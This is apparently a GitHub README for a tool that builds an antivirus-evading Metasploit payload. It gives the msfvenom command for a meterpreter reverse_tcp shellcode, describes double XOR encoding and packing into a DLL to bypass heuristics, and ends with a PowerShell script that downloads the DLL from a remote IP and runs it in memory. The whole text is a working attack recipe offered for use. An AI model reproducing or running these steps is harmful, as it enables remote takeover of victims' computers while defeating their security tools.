# RS_meterpreter_bypass
These two C# programs are used to encode and create a .dll file from a starting metasploit xor encoded reverse_tcp payload.

# How to use
Fisrt of all: generate shellcode in C# format, and use msfvenom's built-in encoder xor_dynamic

> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f csharp -e x64/xor_dynamic

Take note of the *buf* variable showed in output.

Now we use our [_XOR_encoder_](https://github.com/marcoigorr/RS_meterpreter_bypass/blob/6e7cf2a56639a471bc8a45d42c06cf47eb2ff10d/XOR_encoder.cs), open this in a new console project on Visual Studio Community and build an executable solution.

- Remember to change the byte array *buf*


We have now a double XOR-encoded shellcode, to bypass AV we will create a .dll to run in memory. We will use [_Class1_](https://github.com/marcoigorr/RS_meterpreter_bypass/blob/6e7cf2a56639a471bc8a45d42c06cf47eb2ff10d/Class1.cs) which is used to execute our payload and also bypass heuristics control.

Build the solution, now we have the .dll, we can host the file in a remote server or ourselves with
> service apache start

Now we just need to execute the .dll, so we do a .ps1 script to do that:

        $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.102/ClassLibrary1.dll')
        $assem = [System.Reflection.Assembly]::Load($data)
        $class = $assem.GetType("ClassLibrary1.Class1")
        $method = $class.GetMethod("Runner")
        $method.Invoke(0, $null)

This PowerShell script will download the DLL, load it directly into memory, and invoke whatever function we name. As shown above, weâ€™re invoking the runner function.
